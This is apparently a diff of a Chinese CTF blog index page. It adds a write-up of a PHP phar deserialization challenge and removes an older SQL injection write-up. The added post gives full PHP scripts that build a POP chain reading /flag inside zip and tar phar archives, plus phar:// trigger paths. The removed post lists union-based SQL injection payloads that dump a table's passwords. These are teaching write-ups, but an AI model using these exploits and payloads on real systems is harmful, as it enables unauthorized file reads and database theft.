@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 13.33px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 11.43px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,74 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-phar反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  	<time datetime="2021-08-21T16:00:00.000Z" itemprop="datePublished">2021-08-22</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        phar反序列化
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="phar反序列化（吃瓜杯attup"><a href="#phar反序列化（吃瓜杯attup" class="headerlink" title="phar反序列化（吃瓜杯attup)"></a>phar反序列化（吃瓜杯attup)</h1><p>打开页面，可知只能是zip、rar、tar文件可以上传，因此我们随意构造一个zip文件上传<br>然后查询上传的zip文件，之后打开页面源码，发现有一处源码泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_POST[&quot;file&quot;];</span><br><span class="line">$stat = @stat($filename);</span><br></pre></td></tr></table></figure>
+<p>其中stat()这个函数用的很少, 用于返回关于文件的信息, 但是它也可以触发 phar 文件, 这里主要是考察了通过 zip 或 tar 文件包装的phar文件进行触发<br>phar反序列化详细请看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p>
+<p>因此我们可以构造pop链并压缩成zip文件或tar文件并包装成phar文件的格式上传，phar文件可以绕过&lt;?和php的过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">zip</span><br><span class="line"></span><br><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new View();</span><br><span class="line">$a-&gt;fn = &#x27;/flag&#x27;;</span><br><span class="line">$b = new Fun();</span><br><span class="line">$b-&gt;fun = $a;</span><br><span class="line">$c = new Fun();</span><br><span class="line">$c-&gt;fun = $b;</span><br><span class="line">$d = serialize($c);</span><br><span class="line">if(file_exists(&#x27;phar.zip&#x27;)) &#123;</span><br><span class="line">    @unlink(&quot;phar.zip&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$zip = new ZipArchive;</span><br><span class="line">$res = $zip-&gt;open(&#x27;phar.zip&#x27;, ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($d);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure>
+<p>以及</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new View();</span><br><span class="line">$a-&gt;fn = &#x27;/flag&#x27;;</span><br><span class="line">$b = new Fun();</span><br><span class="line">$b-&gt;fun = $a;</span><br><span class="line">$c = new Fun();</span><br><span class="line">$c-&gt;fun = $b;</span><br><span class="line">@unlink(&quot;phar.tar&quot;);</span><br><span class="line">@system(&#x27;rm -r .phar&#x27;);</span><br><span class="line">@system(&#x27;mkdir .phar&#x27;);</span><br><span class="line">file_put_contents(&#x27;.phar/.metadata&#x27;,serialize($c));</span><br><span class="line">system(&#x27;tar -cf phar.tar .phar/*&#x27;);</span><br></pre></td></tr></table></figure>
+<p>然后构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar://./phar.tar</span><br><span class="line">phar:///var/www/html/uploads/phar.tar</span><br></pre></td></tr></table></figure>
+<p>即可通过 phar 反序列化触发 pop 链得到 flag </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-异或注入及ssrf读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -876,82 +944,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-LoveSQL" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/LoveSQL/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/LoveSQL/">
-        LoveSQL
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><p>首先在password中构造万能语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or 1=1#</span><br></pre></td></tr></table></figure>
-<p>可以看到admin的密码，要多尝试字符，看是什么闭合，这里是单引号闭合</p>
-<p>然后使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
-<p>找到返回数据显示的位置</p>
-<p>然后构造联合注入语句</p>
-<p>首先使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,(select database()),3#</span><br></pre></td></tr></table></figure>
-<p>找出当前使用数据库的名字</p>
-<p>然后使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#</span><br></pre></td></tr></table></figure>
-<p>查看数据表，看到有两张表，分别为geekuser和IOve1ysq1</p>
-<p>然后查看两张表的字段的信息，发现flag在IOve1ysq1的password中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,(select group_concat(columns_name) from information_schema.columns where table_schema=database() and table_name=&#x27;IOve1sq1&#x27;#</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,2,group_concat(password) from IOve1ysq1#</span><br></pre></td></tr></table></figure>
-
-<p>可以看见flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
 	</div>
 
       
